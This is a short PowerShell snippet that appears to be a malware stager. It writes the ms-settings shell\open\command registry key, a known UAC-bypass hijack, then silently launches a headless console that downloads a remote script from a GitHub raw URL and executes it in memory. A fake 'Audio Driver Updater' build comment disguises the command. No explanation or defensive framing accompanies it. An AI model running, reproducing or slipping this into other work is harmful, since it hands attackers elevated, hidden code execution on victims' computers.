Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\$env:USERNAME\not-existent-yet"
Start-Process conhost.exe -ArgumentList "--headless powershell -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/brabus4.ps1 | iex; '# Audio Driver Updater 4.7X - (Build 2025.01.12)'`""
